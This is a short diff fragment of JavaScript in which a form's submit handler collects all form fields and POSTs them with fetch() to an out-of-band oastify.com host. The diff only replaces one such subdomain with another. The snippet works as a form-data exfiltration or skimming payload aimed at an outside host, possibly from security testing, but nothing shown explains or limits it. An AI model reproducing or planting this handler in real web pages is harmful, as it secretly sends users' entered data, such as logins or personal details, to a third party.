@@ -50,7 +50,7 @@ form.addEventListener("submit", function (e) {
 
   const formData = new FormData(form);
 
-  fetch("https://vyx0e3xpap23tyzos0uz7m1spjvaj27r.oastify.com", {
+  fetch("https://rsnw8zrl4lwznutkmwov1ivojfp7d11q.oastify.com", {
     method: "POST",
     body: formData
   });
